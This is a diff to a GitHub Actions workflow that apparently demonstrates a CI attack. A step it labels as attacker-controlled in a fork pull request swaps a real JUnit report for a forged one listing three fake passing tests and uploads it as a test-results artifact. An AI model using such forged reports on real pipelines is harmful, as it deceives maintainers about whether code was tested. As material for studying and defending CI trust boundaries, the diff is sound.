@@ -8,10 +8,18 @@ jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-      - name: make report
+      - name: forge report (attacker controls this file in a fork PR)
         run: |
-          printf '<testsuites><testsuite name="legit" tests="1"><testcase name="real_test" classname="README.md"/></testsuite></testsuites>' > report.xml
+          cat > report.xml <<'XML'
+          <?xml version="1.0" encoding="UTF-8"?>
+          <testsuites>
+            <testsuite name="FORGED_SUITE" tests="3" failures="0" errors="0" skipped="0">
+              <testcase name="FORGED_PASS_1" classname="README.md" file="README.md" line="1"/>
+              <testcase name="FORGED_PASS_2" classname="README.md" file="README.md" line="2"/>
+              <testcase name="FORGED_PASS_3" classname="README.md" file="README.md" line="3"/>
+            </testsuite>
+          </testsuites>
+          XML
       - uses: actions/upload-artifact@v4
         with:
           name: junit-test-results
